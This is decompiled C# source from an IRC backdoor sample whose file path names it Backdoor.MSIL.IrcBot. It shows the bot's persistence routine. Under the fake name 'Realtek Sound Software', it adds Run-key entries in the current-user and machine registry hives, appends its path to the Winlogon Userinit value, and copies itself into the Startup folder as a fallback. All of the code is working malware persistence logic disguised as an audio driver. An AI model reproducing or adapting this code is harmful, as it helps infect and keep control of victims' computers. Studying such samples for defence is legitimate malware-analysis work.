// Decompiled with JetBrains decompiler
// Type: Realtek.Reg
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace Realtek
{
  internal class Reg
  {
    public static void WatchThread()
    {
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\audio\\sound.exe";
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Sound.exe";
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Realtek Sound Software") == null)
          registryKey.SetValue("Realtek Sound Software", (object) str1);
        else if (registryKey.GetValue("Realtek Sound Software") != (object) str1)
        {
          registryKey.DeleteValue("Realtek Sound Software");
          registryKey.SetValue("Realtek Sound Software", (object) str1);
        }
      }
      catch
      {
        if (!File.Exists(str2))
        {
          try
          {
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, str2);
          }
          catch
          {
          }
        }
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("Realtek Sound Software") == null)
          registryKey.SetValue("Realtek Sound Software", (object) str1);
        else if (registryKey.GetValue("Realtek Sound Software") != (object) str1)
        {
          registryKey.DeleteValue("Realtek Sound Software");
          registryKey.SetValue("Realtek Sound Software", (object) str1);
        }
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
        string str3 = registryKey.GetValue("Userinit").ToString();
        if (str3.Contains(str1))
          return;
        registryKey.SetValue("Userinit", (object) (str3 + str1 + ","));
      }
      catch
      {
      }
    }
  }
}
